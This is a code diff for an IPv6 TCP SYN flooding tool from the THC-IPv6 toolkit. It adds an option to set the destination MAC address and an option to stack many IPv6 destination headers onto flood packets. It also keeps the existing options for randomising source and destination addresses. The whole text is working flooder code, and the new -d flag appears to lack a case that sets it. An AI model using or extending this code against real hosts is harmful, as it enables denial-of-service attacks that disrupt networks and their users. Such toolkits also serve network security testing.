@@ -11,15 +11,18 @@
 #include "thc-ipv6.h"
 
 void help(char *prg) {
-  printf("%s %s (c) 2013 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
-  printf("Syntax: %s [-AcDrRS] [-p port] [-s sourceip6] interface target port\n\n", prg);
+  printf("%s %s (c) 2014 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
+  printf("Syntax: %s [-AcDrRS] [-m dstmac] [-p port] [-s sourceip6] interface target port\n\n", prg);
   printf("Options:\n");
+  printf(" -a      add hop-by-hop header with router alert\n");
+  printf(" -d      add destination header (can be set up to 150 times)\n");
   printf(" -A      send TCP-ACK packets\n");
   printf(" -S      send TCP-SYN-ACK packets\n");
   printf(" -r      randomize the source from your /64 prefix\n");
   printf(" -R      randomize the source fully\n");
-  printf(" -s sourceip6  use this as source IPv6 address\n");
   printf(" -D      randomize the destination (treat as /64)\n");
+  printf(" -m dstmac     use this destination mac address\n");
+  printf(" -s sourceip6  use this as source IPv6 address\n");
   printf(" -p port       use fixed source port\n");
   printf("\nFlood the target port with TCP-SYN packets. If you supply \"x\" as port, it\nis randomized.\n");
   exit(-1);
@@ -29,8 +32,8 @@ void help(char *prg) {
 
 int main(int argc, char *argv[]) {
   char *interface, *ptr, buf2[8];
-  unsigned char *dst = NULL, *dstmac = NULL, *src = NULL, *srcmac = NULL;
-  int i, type = TCP_SYN, alert = 0, randsrc = 0, randdst = 0, randsrcp = 1, randdstp = 0, dont_crc = 0, seq;
+  unsigned char *dst = NULL, *dstmac = NULL, *src = NULL, *srcmac = NULL, dmac[6];
+  int i, type = TCP_SYN, alert = 0, randsrc = 0, randdst = 0, randsrcp = 1, randdstp = 0, dont_crc = 0, seq, do_dst = 0;
   unsigned char *pkt = NULL;
   int pkt_len = 0, count = 0;
   unsigned short int sport, port;
@@ -42,7 +45,7 @@ int main(int argc, char *argv[]) {
   setvbuf(stdout, NULL, _IONBF, 0);
   setvbuf(stderr, NULL, _IONBF, 0);
   
-   while ((i = getopt(argc, argv, "aAcrRsDSp:")) >= 0) {
+   while ((i = getopt(argc, argv, "aAcrRsDSp:m:d")) >= 0) {
      switch(i) {
        case 'a':
          alert = 8;
@@ -56,6 +59,11 @@ int main(int argc, char *argv[]) {
        case 'c':
          dont_crc = IDS_STRING;
          break;
+       case 'm':
+         sscanf(optarg, "%x:%x:%x:%x:%x:%x", (unsigned int *) &dmac[0], (unsigned int *) &dmac[1],
+           (unsigned int *) &dmac[2], (unsigned int *) &dmac[3], (unsigned int *) &dmac[4], (unsigned int *) &dmac[5]);
+         dstmac = dmac;
+         break;
        case 'r':
          randsrc = 8;
          break;
@@ -68,6 +76,7 @@ int main(int argc, char *argv[]) {
        case 'p':
          sport = atoi(optarg);
          randsrcp = 0;
+         break;
        case 's':
          src = thc_resolve6(optarg);
          break;
@@ -109,9 +118,11 @@ int main(int argc, char *argv[]) {
     exit(-1);
   }
   
-  if ((dstmac = thc_get_mac(interface, src, dst)) == NULL) {
-    fprintf(stderr, "Error: can not find a route to target %s\n", argv[2]);
-    exit(-1);
+  if (dstmac == NULL) {
+    if ((dstmac = thc_get_mac(interface, src, dst)) == NULL) {
+      fprintf(stderr, "Error: can not find a route to target %s\n", argv[2]);
+      exit(-1);
+    }
   }
 
   memset(buf2, 0, sizeof(buf2));
@@ -140,6 +151,14 @@ int main(int argc, char *argv[]) {
     if (alert) {
       if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf2, 6) < 0)
         return -1;
+    }
+    if (do_dst) {
+      if (do_dst > (thc_get_mtu(interface) - 40 - alert - 24) / 8)
+        do_dst = (thc_get_mtu(interface) - 40 - alert - 24) / 8;
+      memset(buf2, 0, sizeof(buf2));
+      for (i = 0; i < do_dst; i++)
+        if (thc_add_hdr_dst(pkt, &pkt_len, buf2, 6) < 0)
+          return -1;
     }
     if (thc_add_tcp(pkt, &pkt_len, sport, port, seq, 0, type, 0x3840, 0, NULL, 0, NULL, 0) < 0)
       return -1;
